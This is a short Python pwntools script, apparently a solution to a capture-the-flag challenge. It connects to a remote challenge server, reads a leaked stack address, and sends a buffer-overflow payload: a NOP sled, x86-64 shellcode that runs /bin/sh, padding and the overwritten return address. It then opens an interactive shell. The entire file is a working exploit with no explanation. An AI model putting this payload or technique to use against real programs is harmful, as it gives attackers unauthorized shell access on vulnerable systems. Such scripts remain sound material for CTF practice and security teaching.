from pwn import *

p = remote('challenges.sshuzl.de', 12371)

output = p.recvuntil('\n')
address = p64(int(output[-13:-1], 16))

sled = (8+128-24-32) * b"\x90"
shellcode = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x48\x31\xf6\x0f\x05"
padding = 32 * b"\x90"

payload = sled + shellcode + padding + address

p.sendline(payload)
p.interactive()
